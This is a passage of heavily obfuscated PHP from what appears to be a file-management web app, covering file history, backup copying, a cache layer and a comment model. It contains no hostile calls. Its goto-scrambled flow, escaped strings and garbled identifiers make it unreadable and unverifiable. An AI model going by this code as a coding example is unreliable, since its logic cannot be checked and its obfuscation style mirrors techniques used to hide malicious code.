$f„∆∞¬õ∫Ø = Model($fê∆œ€ƒŸ[520])->userListInfo($Cáë˜‹âÉ·); foreach ($C¨ﬂãâŸŒ as &$dåÙ®†≥åÖ) { $BÉ  åªÒô = $dåÙ®†≥åÖ[$fê∆œ€ƒŸ[1537]]; $dåÙ®†≥åÖ[$fê∆œ€ƒŸ[433]] = $f„∆∞¬õ∫Ø[$BÉ  åªÒô] ? $f„∆∞¬õ∫Ø[$BÉ  åªÒô] : !1; } unset($dåÙ®†≥åÖ); } public function fileInfo($dêÙÁ…ö¯¥) { $dçæ¢°›≠≠ =& $_SERVER[™⁄»üÆ]; $f©¬îäàÔŸ = $this->tablePrefix; $eÚÆ∫…ƒ∂ê = "{$f©¬îäàÔŸ}\x69\157\137\146\151\x6c\145\x20\x66\x69\x6c\x65\163\40\x6f\x6e\x20\146\x69\154\x65\x73\56\146\x69\154\145\x49\x44\x20\x3d\40\150\151\163\x74\x6f\162\x79\x2e\146\x69\154\145\x49\x44"; return $this->alias($dçæ¢°›≠≠[1947])->where(array($dçæ¢°›≠≠[413] => $dêÙÁ…ö¯¥))->join($eÚÆ∫…ƒ∂ê, $dçæ¢°›≠≠[1948])->find(); } public function removeItem($FÕ©Áà£øñ) { $a‡ù≠ﬂ”Àà =& $_SERVER[™⁄»üÆ]; $cπÜ‚ÛÕƒö = array($a‡ù≠ﬂ”Àà[413] => $FÕ©Áà£øñ); $E√‰∂åæÑò = $this->where($cπÜ‚ÛÕƒö)->find(); if ($E√‰∂åæÑò) { $dÇÁÿ®â‰Ë = $this->where($cπÜ‚ÛÕƒö)->delete(); Model($a‡ù≠ﬂ”Àà[451])->remove($E√‰∂åæÑò[$a‡ù≠ﬂ”Àà[448]]); return $dÇÁÿ®â‰Ë; } return !1; } public function removeBySource($Añ°Œé˜öç) { goto E„”Ôõ‹Üƒ; E„”Ôõ‹Üƒ: $D•€çôŒπÃ =& $_SERVER[™⁄»üÆ]; if (!$Añ°Œé˜öç) { return !1; } if (!is_array($Añ°Œé˜öç)) { $Añ°Œé˜öç = array($Añ°Œé˜öç); } goto FÇ•∆µ®ŒØ; FÇ•∆µ®ŒØ: $D»è≈à◊úﬂ = array($D•€çôŒπÃ[411] => array($D•€çôŒπÃ[7], $Añ°Œé˜öç)); $cÂëòãŸ∞ò = $this->field($D•€çôŒπÃ[449])->where($D»è≈à◊úﬂ)->select(); if ($cÂëòãŸ∞ò) { $this->where($D»è≈à◊úﬂ)->delete(); $e‰√èËÖã∫ = array_to_keyvalue($cÂëòãŸ∞ò, $D•€çôŒπÃ[33], $D•€çôŒπÃ[448]); Model($D•€çôŒπÃ[451])->remove($e‰√èËÖã∫); } goto f”Ë¿â“–˘; f”Ë¿â“–˘: return !0; goto b¶èÊ·’Íé; b¶èÊ·’Íé: } public function setDetail($BËö˘¡õ˜÷, $DôÒò∆Á¯Ú) { $e¶À”¬ë™Ï =& $_SERVER[™⁄»üÆ]; return $this->where(array($e¶À”¬ë™Ï[413] => $BËö˘¡õ˜÷))->save(array($e¶À”¬ë™Ï[1938] => $DôÒò∆Á¯Ú)); } public function rollbackToItem($d∫—çäÀ«Ö, $a∑øÙÊöî›) { goto dëå§Î∑ëœ; bê…÷É≠Ñô: return $this->where(array($FΩ£ÜºÑ©°[413] => $a∑øÙÊöî›))->delete(); goto Fûè∏”Â¨Ü; bÏ∂©πﬁœå: $CíÜ∑¥¢©Æ = $this->find($a∑øÙÊöî›); $E£ÿ◊‚ÒπÀ = array($FΩ£ÜºÑ©°[448] => $CíÜ∑¥¢©Æ[$FΩ£ÜºÑ©°[448]], $FΩ£ÜºÑ©°[78] => $CíÜ∑¥¢©Æ[$FΩ£ÜºÑ©°[78]], $FΩ£ÜºÑ©°[84] => time(), $FΩ£ÜºÑ©°[435] => USER_ID); Model($FΩ£ÜºÑ©°[809])->where(array($FΩ£ÜºÑ©°[396] => $d∫—çäÀ«Ö))->save($E£ÿ◊‚ÒπÀ); goto bê…÷É≠Ñô; dëå§Î∑ëœ: $FΩ£ÜºÑ©° =& $_SERVER[™⁄»üÆ]; $E‘±‘ÿº¿† = Model($FΩ£ÜºÑ©°[809])->sourceInfo($d∫—çäÀ«Ö); $this->addHistory($E‘±‘ÿº¿†, LNG($FΩ£ÜºÑ©°[1949])); goto bÏ∂©πﬁœå; Fûè∏”Â¨Ü: } public function clearSame($B∞õ≥ôﬂÏï) { goto F€ÿ•˜óÑ¶; F€ÿ•˜óÑ¶: $f°ë∞Á≈ËŸ =& $_SERVER[™⁄»üÆ]; $dπöáˆçÜà = $this->listData($B∞õ≥ôﬂÏï); $f’≤¬∞–ç† = array_to_keyvalue_group($dπöáˆçÜà, $f°ë∞Á≈ËŸ[448]); goto A≈ò≤‘≠úÿ; B”Ö◊ÌìÚá: if (!$fŒ€â˘öøØ) { return; } $this->where(array($f°ë∞Á≈ËŸ[394] => array($f°ë∞Á≈ËŸ[7], $fŒ€â˘öøØ)))->delete(); Model($f°ë∞Á≈ËŸ[451])->remove($D≥ôùàîó¢); goto Cò¢ÃÀº¥›; A≈ò≤‘≠úÿ: $D≥ôùàîó¢ = array(); $fŒ€â˘öøØ = array(); foreach ($f’≤¬∞–ç† as $BŸåÑıáÜ¢) { if (!$BŸåÑıáÜ¢ || count($BŸåÑıáÜ¢) <= 1) { continue; } foreach ($BŸåÑıáÜ¢ as $Dè¿û“æÁ¢) { $D≥ôùàîó¢[] = $Dè¿û“æÁ¢[$f°ë∞Á≈ËŸ[448]]; $fŒ€â˘öøØ[] = $Dè¿û“æÁ¢[$f°ë∞Á≈ËŸ[394]]; } } goto B”Ö◊ÌìÚá; Cò¢ÃÀº¥›: } public function userSpace() { $DÛ™∞Üóß© =& $_SERVER[™⁄»üÆ]; $bÁï¨∑©Ôõ = $this->tablePrefix; $D∆±∏óµÒ™ = array($DÛ™∞Üóß©[1528] => USER_ID); $Cüéå·Ùá… = "{$bÁï¨∑©Ôõ}\151\x6f\137\146\x69\154\145\40\146\x69\x6c\x65\163\40\x6f\x6e\40\x66\x69\154\x65\163\x2e\146\151\154\145\111\x44\40\75\40\x68\151\x73\x74\157\162\x79\x2e\x66\x69\154\145\x49\x44"; return $this->alias($DÛ™∞Üóß©[1947])->where($D∆±∏óµÒ™)->join($Cüéå·Ùá…, $DÛ™∞Üóß©[1948])->sum($DÛ™∞Üóß©[78]); } } goto eÜíÜîí—µ; eÃë´Ñè¢Æ: class BackupFile { public function __construct() { } public function index() { goto Bè∏Æ¥∞»–; b“»ÖÓ€è¬: $f≈Ñªó¢ﬁ¡ = (int) Model($_SERVER[™⁄»üÆ][766])->where($E∑ΩŸÛìÓÒ)->count($_SERVER[™⁄»üÆ][448]); $f»°õï“ˆä = (int) Model($_SERVER[™⁄»üÆ][766])->where($E∑ΩŸÛìÓÒ)->sum($_SERVER[™⁄»üÆ][78]); $eÉá°øä≈Ë = new TaskFileTransfer($_SERVER[™⁄»üÆ][793], $_SERVER[™⁄»üÆ][761], $f≈Ñªó¢ﬁ¡, LNG($_SERVER[™⁄»üÆ][762]) . $_SERVER[™⁄»üÆ][763] . LNG($_SERVER[™⁄»üÆ][794])); goto b§·√≤ÀÓÊ; FÛçÕÜ∏Ÿ¡: $A¨πç∏‚›° = !0; $a±◊çòíã’ = $this->storeIds(); $CÙÒ”üçèç = 1; goto e˘‹≠éöﬁÓ; e˘‹≠éöﬁÓ: $Cº©‰¢ùàõ = 1000; $c∫Àßã÷Øç = $bŸÀÿù˘®ø = 0; $CŒŸØªÆê® = array(); goto FöÌøß◊¶†; b§·√≤ÀÓÊ: $eÉá°øä≈Ë->task[$_SERVER[™⁄»üÆ][742]] = $f»°õï“ˆä; $d∫ª¿ÖΩ∞Ü = array($_SERVER[™⁄»üÆ][795] => $f≈Ñªó¢ﬁ¡, $_SERVER[™⁄»üÆ][796] => $f»°õï“ˆä, $_SERVER[™⁄»üÆ][797] => time()); Backup::set($d∫ª¿ÖΩ∞Ü); goto FÛçÕÜ∏Ÿ¡; Bè∏Æ¥∞»–: $FÂ øâ√¿Ç = Backup::get(); $b“≤‹çæ—ª = $FÂ øâ√¿Ç[$_SERVER[™⁄»üÆ][291]][$_SERVER[™⁄»üÆ][193]][$_SERVER[™⁄»üÆ][448]]; $E∑ΩŸÛìÓÒ = array($_SERVER[™⁄»üÆ][449] => array($_SERVER[™⁄»üÆ][791], $b“≤‹çæ—ª), $_SERVER[™⁄»üÆ][792] => array($_SERVER[™⁄»üÆ][329], $FÂ øâ√¿Ç[$_SERVER[™⁄»üÆ][731]])); goto b“»ÖÓ€è¬; BÚ˘Ïî¿≠≤: $d∫ª¿ÖΩ∞Ü = array($_SERVER[™⁄»üÆ][807] => 1, $_SERVER[™⁄»üÆ][477] => time(), $_SERVER[™⁄»üÆ][754] => 1, $_SERVER[™⁄»üÆ][804] => $b“≤‹çæ—ª, $_SERVER[™⁄»üÆ][796] => $f»°õï“ˆä, $_SERVER[™⁄»üÆ][795] => $f≈Ñªó¢ﬁ¡, $_SERVER[™⁄»üÆ][808] => time()); if ($bŸÀÿù˘®ø) { $d∫ª¿ÖΩ∞Ü[$_SERVER[™⁄»üÆ][805]] = $CŒûöˆé≠«; $d∫ª¿ÖΩ∞Ü[$_SERVER[™⁄»üÆ][806]] = $e∫±∑»â¨à; } Backup::set($d∫ª¿ÖΩ∞Ü); goto Eß¿í¯ıÑË; Eß¿í¯ıÑË: $this->_fileFilter($CŒŸØªÆê®); return !0; goto DÉÙÌàÕÏº; FöÌøß◊¶†: $e∫±∑»â¨à = $CŒûöˆé≠« = 0; do { $d£ı›ßí å = $_SERVER[™⁄»üÆ][798]; $E í∫µâñ÷ = Model($_SERVER[™⁄»üÆ][766])->where($E∑ΩŸÛìÓÒ)->field($d£ı›ßí å)->order($_SERVER[™⁄»üÆ][799])->selectPage($Cº©‰¢ùàõ, $CÙÒ”üçèç); $B´¥Ω»ƒµ◊ = !empty($E í∫µâñ÷[$_SERVER[™⁄»üÆ][367]]) ? $E í∫µâñ÷[$_SERVER[™⁄»üÆ][367]] : array(); foreach ($B´¥Ω»ƒµ◊ as $FﬁúÜïä“Ô) { goto Eﬂøº∞ëõË; Eﬂøº∞ëõË: if (!$this->_fileExist($FﬁúÜïä“Ô, $CŒŸØªÆê®, $a±◊çòíã’)) { $f≈Ñªó¢ﬁ¡ -= 1; $f»°õï“ˆä -= (int) $FﬁúÜïä“Ô[$_SERVER[™⁄»üÆ][78]]; write_log("\146\151\154\145\x20\156\x6f\164\40\145\170\x69\163\x74\56\x66\x69\x6c\145\x49\x44\x3a{$FﬁúÜïä“Ô[$_SERVER[™⁄»üÆ][448]]}\x2c\x20\160\141\164\x68\72{$FﬁúÜïä“Ô[$_SERVER[™⁄»üÆ][76]]}", $_SERVER[™⁄»üÆ][800]); continue; } $BÛ⁄™Ÿè§‡ = $FﬁúÜïä“Ô[$_SERVER[™⁄»üÆ][76]]; $Dƒ™êá©ÌÀ = "\173\x69\157\x3a{$FÂ øâ√¿Ç[$_SERVER[™⁄»üÆ][731]]}\175" . substr($BÛ⁄™Ÿè§‡, strlen("\173\x69\157\x3a{$FﬁúÜïä“Ô[$_SERVER[™⁄»üÆ][801]]}\175")); goto BØÜ‰¥¬Ù°; E˘ ìÉíùÑ: $c∫Àßã÷Øç += $FﬁúÜïä“Ô[$_SERVER[™⁄»üÆ][78]]; $CŒûöˆé≠« += 1; $e∫±∑»â¨à += $FﬁúÜïä“Ô[$_SERVER[™⁄»üÆ][78]]; goto eø¥¡í«§±; eø¥¡í«§±: if ($c∫Àßã÷Øç >= 1024 * 1024 * 100) { $d∫ª¿ÖΩ∞Ü = array($_SERVER[™⁄»üÆ][804] => $b“≤‹çæ—ª, $_SERVER[™⁄»üÆ][805] => $CŒûöˆé≠«, $_SERVER[™⁄»üÆ][806] => $e∫±∑»â¨à); Backup::set($d∫ª¿ÖΩ∞Ü); $c∫Àßã÷Øç = $bŸÀÿù˘®ø = 0; } goto BÃí°¥Âù≠; BØÜ‰¥¬Ù°: if (IO::exist($Dƒ™êá©ÌÀ)) { $eÉá°øä≈Ë->updateFileEnd($FﬁúÜïä“Ô[$_SERVER[™⁄»üÆ][28]], $FﬁúÜïä“Ô[$_SERVER[™⁄»üÆ][78]]); } else { $Dƒ™êá©ÌÀ = get_path_father($Dƒ™êá©ÌÀ); IO::mkdir($Dƒ™êá©ÌÀ); if (!IO::copy($BÛ⁄™Ÿè§‡, $Dƒ™êá©ÌÀ, $_SERVER[™⁄»üÆ][802])) { write_log($_SERVER[™⁄»üÆ][803] . $BÛ⁄™Ÿè§‡ . $_SERVER[™⁄»üÆ][786] . $Dƒ™êá©ÌÀ . $_SERVER[™⁄»üÆ][518], $_SERVER[™⁄»üÆ][761]); $A¨πç∏‚›° = !1; break; } } $b“≤‹çæ—ª = $FﬁúÜïä“Ô[$_SERVER[™⁄»üÆ][448]]; $bŸÀÿù˘®ø += 1; goto E˘ ìÉíùÑ; BÃí°¥Âù≠: } $få´áÚüÒÊ = count($B´¥Ω»ƒµ◊); $CÙÒ”üçèç++; } while ($få´áÚüÒÊ == $Cº©‰¢ùàõ); $eÉá°øä≈Ë->end(); goto BÚ˘Ïî¿≠≤; DÉÙÌàÕÏº: } private function _fileExist($B°ó˘üæÊ”, &$aÉÃŸààö¬, $a‡πê‹ëπÒ) { goto D˜˘èë∆∏Ç; e‚¢”Ëƒ£ƒ: $aÉÃŸààö¬ = array_merge($aÉÃŸààö¬, array_to_keyvalue($Dñü±êÁÜ⁄, $cŸí©…ùÒÇ[33], $cŸí©…ùÒÇ[448])); return !1; goto D§Ü“∞Õ‡á; D˜˘èë∆∏Ç: $cŸí©…ùÒÇ =& $_SERVER[™⁄»üÆ]; $dëÃåÃÈˆÜ = $B°ó˘üæÊ”[$cŸí©…ùÒÇ[76]]; if (in_array($B°ó˘üæÊ”[$cŸí©…ùÒÇ[448]], $aÉÃŸààö¬)) { return !1; } goto e‡éäå∫äâ; Cπ≠ÚëÍˆ®: if (IO::exist($A∫ÿµª·›Ê)) { $aÉÃŸààö¬[] = $B°ó˘üæÊ”[$cŸí©…ùÒÇ[448]]; return !1; } $D¨ÔäÁèâˆ = array($cŸí©…ùÒÇ[801] => $B°ó˘üæÊ”[$cŸí©…ùÒÇ[801]], $cŸí©…ùÒÇ[76] => array($cŸí©…ùÒÇ[380], "{$A∫ÿµª·›Ê}\x25")); $Dñü±êÁÜ⁄ = Model($cŸí©…ùÒÇ[766])->where($D¨ÔäÁèâˆ)->field($cŸí©…ùÒÇ[449])->select(); goto e‚¢”Ëƒ£ƒ; e‡éäå∫äâ: if (!in_array($B°ó˘üæÊ”[$cŸí©…ùÒÇ[801]], $a‡πê‹ëπÒ)) { return !1; } if (IO::exist($dëÃåÃÈˆÜ)) { return !0; } $A∫ÿµª·›Ê = get_path_father($dëÃåÃÈˆÜ); goto Cπ≠ÚëÍˆ®; D§Ü“∞Õ‡á: } private function _fileFilter($eÀ…Ù√ô›â) { $F◊ª€Üèëã =& $_SERVER[™⁄»üÆ]; if (empty($eÀ…Ù√ô›â)) { return; } $DâëÒ∏ß…ô = array($F◊ª€Üèëã[448] => array($F◊ª€Üèëã[7], array_unique($eÀ…Ù√ô›â))); $Aœß®÷∞îã = Model($F◊ª€Üèëã[809])->where($DâëÒ∏ß…ô)->field($F◊ª€Üèëã[396])->select(); foreach ($Aœß®÷∞îã as $cªê≥ŸÕé‰) { Model($F◊ª€Üèëã[809])->remove($cªê≥ŸÕé‰[$F◊ª€Üèëã[396]], !1); } } private function storeIds() { $D÷ÕÒƒ¯éŒ =& $_SERVER[™⁄»üÆ]; $Cº•”øÁ≥ˆ = Model($D÷ÕÒƒ¯éŒ[746])->listData(); $Bﬂ¥¥çË˜Ô = array(); $AŸ√ä„ŒØ∑ = $GLOBALS[$D÷ÕÒƒ¯éŒ[6]][$D÷ÕÒƒ¯éŒ[88]][$D÷ÕÒƒ¯éŒ[810]]; foreach ($Cº•”øÁ≥ˆ as $a„ø≠«Ú›õ) { $BéÿòêÛËË = strtolower($a„ø≠«Ú›õ[$D÷ÕÒƒ¯éŒ[94]]); if (!isset($AŸ√ä„ŒØ∑[$BéÿòêÛËË])) { continue; } $D¯ÁßŒÖÒÕ = $D÷ÕÒƒ¯éŒ[72] . (isset($AŸ√ä„ŒØ∑[$BéÿòêÛËË]) ? $AŸ√ä„ŒØ∑[$BéÿòêÛËË] : ucfirst($BéÿòêÛËË)); if (!class_exists($D¯ÁßŒÖÒÕ)) { continue; } $Bﬂ¥¥çË˜Ô[] = $a„ø≠«Ú›õ[$D÷ÕÒƒ¯éŒ[394]]; } return $Bﬂ¥¥çË˜Ô; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto d†˘èöà∆È; eÃü®Ê¬ç»: switch ($DŒ›Ü©∏∏Ë[$E⁄§Ã¢À´£[811]]) { case $E⁄§Ã¢À´£[17]: self::$handle = Model($E⁄§Ã¢À´£[813]); break; case $E⁄§Ã¢À´£[814]: self::$handle = new CacheRedis($E˘˘ —ÎŒÏ, $dØÖÇºãëæ); break; case $E⁄§Ã¢À´£[815]: self::$handle = new CacheMemcached($E˘˘ —ÎŒÏ, $dØÖÇºãëæ); break; case $E⁄§Ã¢À´£[193]: self::$handle = new CacheFile($E˘˘ —ÎŒÏ, $dØÖÇºãëæ); break; default: break; } return self::$handle; goto eÁ·Œ’›Ë¨; eóÇ§ Ñî°: $DŒ›Ü©∏∏Ë = $GLOBALS[$E⁄§Ã¢À´£[6]][$E⁄§Ã¢À´£[347]]; $E˘˘ —ÎŒÏ = $DŒ›Ü©∏∏Ë[$DŒ›Ü©∏∏Ë[$E⁄§Ã¢À´£[811]]]; $dØÖÇºãëæ = $DŒ›Ü©∏∏Ë[$E⁄§Ã¢À´£[812]]; goto eÃü®Ê¬ç»; d†˘èöà∆È: $E⁄§Ã¢À´£ =& $_SERVER[™⁄»üÆ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto eóÇ§ Ñî°; eÁ·Œ’›Ë¨: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($d∏≠ÇÜåÆß) { if (is_array($d∏≠ÇÜåÆß) || is_object($d∏≠ÇÜåÆß)) { $d∏≠ÇÜåÆß = json_encode($d∏≠ÇÜåÆß); } $d∏≠ÇÜåÆß = rawurlencode($d∏≠ÇÜåÆß); return md5(KOD_SITE_ID . $_SERVER[™⁄»üÆ][71] . $d∏≠ÇÜåÆß); } public static function get($FÑÎåÀ√Õí, $f·‡‰Â»ß⁄ = false) { $b•¨√Ç√ëï = self::key($FÑÎåÀ√Õí); if ($f·‡‰Â»ß⁄) { return unserialize(self::init()->get($b•¨√Ç√ëï)); } if (!isset(self::$memoryCache[$b•¨√Ç√ëï])) { $fèΩÛ‚ÀÓê = self::init()->get($b•¨√Ç√ëï); self::$memoryCache[$b•¨√Ç√ëï] = unserialize($fèΩÛ‚ÀÓê); } return self::$memoryCache[$b•¨√Ç√ëï]; } public static function set($D›õä˜£‡è, $c©Èëﬂå§Ç, $dÑçßà√¶˜ = false) { goto Cë‡≤èÒ±ø; Cë‡≤èÒ±ø: $B◊‘©æÔõ◊ = self::key($D›õä˜£‡è); if (isset(self::$memoryCache[$B◊‘©æÔõ◊]) && self::$memoryCache[$B◊‘©æÔõ◊] === $c©Èëﬂå§Ç) { return !0; } if ($dÑçßà√¶˜ === 0) { self::$memoryCache[$B◊‘©æÔõ◊] = $c©Èëﬂå§Ç; return !0; } goto CŸîî≤¨˘Ï; CŸîî≤¨˘Ï: CacheLock::lock($D›õä˜£‡è); $dÖñ…ÚÖÖæ = self::init()->set($B◊‘©æÔõ◊, serialize($c©Èëﬂå§Ç), $dÑçßà√¶˜); self::$memoryCache[$B◊‘©æÔõ◊] = $c©Èëﬂå§Ç; goto DÌ€æ¶†ØÎ; DÌ€æ¶†ØÎ: CacheLock::unlock($D›õä˜£‡è); return $dÖñ…ÚÖÖæ; goto b· ©›îçµ; b· ©›îçµ: } public static function getCall($b®ÉïØ≤·ê, $F—¶‹Öñ‰ë, $aÖŒ≠πÑŸó, $FƒÂÿü¢®Ç = array()) { goto b„û÷Èˆ»¯; eú∑πçøì≠: return $bÁÒ≤®≠ùÉ; goto aÎ›¬¬ Ø—; b„û÷Èˆ»¯: $fÁ•Ô¡Ÿ«ó =& $_SERVER[™⁄»üÆ]; $bÁÒ≤®≠ùÉ = self::get($b®ÉïØ≤·ê); if ($bÁÒ≤®≠ùÉ || $bÁÒ≤®≠ùÉ === $fÁ•Ô¡Ÿ«ó[33]) { return $bÁÒ≤®≠ùÉ; } goto c©Õ◊ô·—à; c©Õ◊ô·—à: $bÁÒ≤®≠ùÉ = call_user_func_array($aÖŒ≠πÑŸó, $FƒÂÿü¢®Ç); $bÁÒ≤®≠ùÉ = $bÁÒ≤®≠ùÉ ? $bÁÒ≤®≠ùÉ : $fÁ•Ô¡Ÿ«ó[33]; self::set($b®ÉïØ≤·ê, $bÁÒ≤®≠ùÉ, $F—¶‹Öñ‰ë); goto eú∑πçøì≠; aÎ›¬¬ Ø—: } public static function remove($a®íÕ≤∂ëà) { goto DâÑ⁄‹˜ú¯; FÁËœ«πÁ·: return $fæ≥ÓÍ∞Èà; goto bŒ±ê¯öﬂ≤; AÍº·åﬂì—: CacheLock::lock($a®íÕ≤∂ëà); $fæ≥ÓÍ∞Èà = self::init()->remove($aÉ‹‰Õ€«ı); CacheLock::unlock($a®íÕ≤∂ëà); goto FÁËœ«πÁ·; DâÑ⁄‹˜ú¯: $aÉ‹‰Õ€«ı = self::key($a®íÕ≤∂ëà); unset(self::$memoryCache[$aÉ‹‰Õ€«ı]); self::clearTimeout(); goto AÍº·åﬂì—; bŒ±ê¯öﬂ≤: } public static function removeMemory($cº⁄çï„éò) { $Açäµ‘ÿˆÕ = self::key($cº⁄çï„éò); unset(self::$memoryCache[$Açäµ‘ÿˆÕ]); } public static function clearMemory($cà±›èÛíÀ = false) { if ($cà±›èÛíÀ) { $cà±›èÛíÀ = self::key($cà±›èÛíÀ); unset(self::$memoryCache[$cà±›èÛíÀ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[™⁄»üÆ][816])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[™⁄»üÆ][817])) { self::init()->clearTimeout(); } } } $B◊åëææŒπ = $_SERVER[$_SERVER[™⁄»üÆ][600]]; goto Açë™·ÇÁË; d«”á∫Œúã: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\145\x6e\164"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\x61\155\x65" => "\143\x6f\x6d\155\145\156\x74\137\155\x65\x74\141", "\155\145\x74\x61\x46\x69\x65\154\x64" => "\143\x6f\x6d\155\x65\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 10000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($f‡ÓØÛ≤·“) { $c˘öèú™°’ =& $_SERVER[™⁄»üÆ]; if ($f‡ÓØÛ≤·“[$c˘öèú™°’[1734]]) { $dÛ‰∏ˆŸÑë = $this->where(array($c˘öèú™°’[1735] => $f‡ÓØÛ≤·“[$c˘öèú™°’[1734]]))->find(); if (!$dÛ‰∏ˆŸÑë || $dÛ‰∏ˆŸÑë[$c˘öèú™°’[405]] != $f‡ÓØÛ≤·“[$c˘öèú™°’[405]] || $dÛ‰∏ˆŸÑë[$c˘öèú™°’[485]] != $f‡ÓØÛ≤·“[$c˘öèú™°’[485]]) { return !1; } $this->where(array($c˘öèú™°’[1735] => $f‡ÓØÛ≤·“[$c˘öèú™°’[1734]]))->setAdd($c˘öèú™°’[1736], 1); } $f‡ÓØÛ≤·“[$c˘öèú™°’[1737]] = 0; $f‡ÓØÛ≤·“[$c˘öèú™°’[1736]] = 0; $f‡ÓØÛ≤·“[$c˘öèú™°’[729]] = 1; return $this->add($f‡ÓØÛ≤·“); } public function commentCount($bÕó»·¡ÏÒ, $DËÜ∫–ñ·Ø, $DæΩ›„ŒÜ» = false) { goto f•˘ÕŒá¨«; f•˘ÕŒá¨«: $C¯ôΩúñŸÖ =& $_SERVER[™⁄»üÆ]; if (!$bÕó»·¡ÏÒ) { return array(); } if (is_string($bÕó»·¡ÏÒ) || is_int($bÕó»·¡ÏÒ)) { $bÕó»·¡ÏÒ = array($bÕó»·¡ÏÒ); } goto AËøÓÿÜ∑Ò; AËøÓÿÜ∑Ò: $e–ñ“‰Ü⁄û = array($C¯ôΩúñŸÖ[485], $C¯ôΩúñŸÖ[1738] => $C¯ôΩúñŸÖ[481]); $f±Ÿ»Ãñê¯ = array($C¯ôΩúñŸÖ[485] => array($C¯ôΩúñŸÖ[7], $bÕó»·¡ÏÒ), $C¯ôΩúñŸÖ[405] => $DËÜ∫–ñ·Ø); if ($DæΩ›„ŒÜ») { $f±Ÿ»Ãñê¯[$C¯ôΩúñŸÖ[1537]] = $DæΩ›„ŒÜ»; } goto bÌÛÀ•ãíœ; bÌÛÀ•ãíœ: $E¢°µ◊≤ƒˆ = $this->field($e–ñ“‰Ü⁄û)->where($f±Ÿ»Ãñê¯)->group($C¯ôΩúñŸÖ[485])->select(); return array_to_keyvalue($E¢°µ◊≤ƒˆ, $C¯ôΩúñŸÖ[485], $C¯ôΩúñŸÖ[481]); goto c”Ø›»áÉó; c”Ø›»áÉó: } public function starTarget($FÓ™œ§ªÜ“, $e…òéÃÏ“€) { goto Dﬁ’∞û÷æ¬; Dﬁ’∞û÷æ¬: $Fû≠ë◊·˜€ =& $_SERVER[™⁄»üÆ]; $Cäò´Ôµãß = $FÓ™œ§ªÜ“ + self::TYPE_STAR_OFFSET; $AÕ€‡≠˜°¿ = array($Fû≠ë◊·˜€[1537] => USER_ID, $Fû≠ë◊·˜€[405] => $Cäò´Ôµãß, $Fû≠ë◊·˜€[485] => $e…òéÃÏ“€); goto Eô€ã¨ƒÎ¿; Eô€ã¨ƒÎ¿: $fÚ´ùöÏÿù = $this->where($AÕ€‡≠˜°¿)->find(); if ($fÚ´ùöÏÿù) { return $this->where(array($Fû≠ë◊·˜€[394] => $fÚ´ùöÏÿù[$Fû≠ë◊·˜€[394]]))->delete(); } $AË»¡â‘∑õ = array($Fû≠ë◊·˜€[1734] => 0, $Fû≠ë◊·˜€[1537] => USER_ID, $Fû≠ë◊·˜€[729] => 1, $Fû≠ë◊·˜€[734] => $Fû≠ë◊·˜€[33], $Fû≠ë◊·˜€[405] => $Cäò´Ôµãß, $Fû≠ë◊·˜€[485] => $e…òéÃÏ“€, $Fû≠ë◊·˜€[1737] => 0, $Fû≠ë◊·˜€[1736] => 0); goto Fø¯É–ﬁ¢Ô; Fø¯É–ﬁ¢Ô: return $this->add($AË»¡â‘∑õ); goto FïÏ¥Æ÷áµ; FïÏ¥Æ÷áµ: } public function starTargetCount($BÉôŒïûã≠, $aÑ≈ÚªÑ‘„) { $b‘‘≥Ω¨æê =& $_SERVER[™⁄»üÆ]; $AÊÉúƒ€™≠ = $aÑ≈ÚªÑ‘„ + self::TYPE_STAR_OFFSET; $D‰“¨ÕòÂ´ = $this->commentCount($BÉôŒïûã≠, $AÊÉúƒ€™≠); $CÎòûèê¿Ÿ = $this->commentCount($BÉôŒïûã≠, $AÊÉúƒ€™≠, USER_ID); return array($b‘‘≥Ω¨æê[1739] => $D‰“¨ÕòÂ´, $b‘‘≥Ω¨æê[1740] => $CÎòûèê¿Ÿ); } public function starTargetUserList($e∑Á¬ŸµÓÖ, $Eà¶Îæ∂⁄ú) { goto eê£„›ßÔò; e„∂∂ãêﬂá: $CÖ‹Â±Ô∞ã = $this->where($A∂°á—òá®)->count(); $E»â—≈…ºü = array($c–Ç¯∂ÁÌΩ[253] => $CÖ‹Â±Ô∞ã, $c–Ç¯∂ÁÌΩ[1741] => array()); if (!$CÖ‹Â±Ô∞ã) { return $E»â—≈…ºü; } goto c≥Ÿ¬Ô£Ë’; eê£„›ßÔò: $c–Ç¯∂ÁÌΩ =& $_SERVER[™⁄»üÆ]; $BË‚à≤ÿﬁ≈ = $e∑Á¬ŸµÓÖ + self::TYPE_STAR_OFFSET; $A∂°á—òá® = array($c–Ç¯∂ÁÌΩ[485] => $Eà¶Îæ∂⁄ú, $c–Ç¯∂ÁÌΩ[405] => $BË‚à≤ÿﬁ≈); goto e„∂∂ãêﬂá; c≥Ÿ¬Ô£Ë’: $CÀÇ˜†Ú∫À = $this->field($c–Ç¯∂ÁÌΩ[1537])->where($A∂°á—òá®)->limit(500)->select(); $CÀÇ˜†Ú∫À = array_to_keyvalue($CÀÇ˜†Ú∫À, $c–Ç¯∂ÁÌΩ[33], $c–Ç¯∂ÁÌΩ[1537]); $E»â—≈…ºü[$c–Ç¯∂ÁÌΩ[1741]] = Model($c–Ç¯∂ÁÌΩ[495])->userListInfo($CÀÇ˜†Ú∫À); goto cÎÁ•Ìâﬁä; cÎÁ•Ìâﬁä: return $E»â—≈…ºü; goto BŒ”¬€è∆†; BŒ”¬€è∆†: } public function prasiseUserList($d—π¥äì∫Œ) { goto døáæÀ¬ˆë; AÓÀÔﬁÍîê: $eÆΩã¢ÌÚŒ = Model($AüëÿëÜÇ‘[1743])->field($AüëÿëÜÇ‘[1537])->where($e‹è®ŸÍå·)->limit(500)->select(); $eÆΩã¢ÌÚŒ = array_to_keyvalue($eÆΩã¢ÌÚŒ, $AüëÿëÜÇ‘[33], $AüëÿëÜÇ‘[1537]); 